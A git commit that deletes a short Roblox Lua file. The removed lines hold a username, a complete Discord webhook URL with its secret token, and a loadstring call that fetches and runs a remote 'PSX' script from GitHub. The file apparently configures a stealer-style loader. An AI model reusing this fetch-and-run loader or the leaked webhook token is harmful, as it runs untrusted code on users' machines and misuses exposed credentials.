92d591718d8b6776f377203b38fa46c1abc1576b
rocl0bsta <125326459+rocl0bsta@users.noreply.github.com>
2023-02-13 19:33:13 -0800

    Delete MILKYENC.lua

--- MILKYENC.lua
+++
@@ -1,5 +0,0 @@
-UserName = "Splitzsy"
-WebHook = "https://discord.com/api/webhooks/1074875569763794944/VVCyq1MX7u_RkNcsF5hxUMa9jV9O_Oq4-3oUQYd3SlZ6Rqy2tS8gc-QJVrYlRhE5cshg"
-Mention = true 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
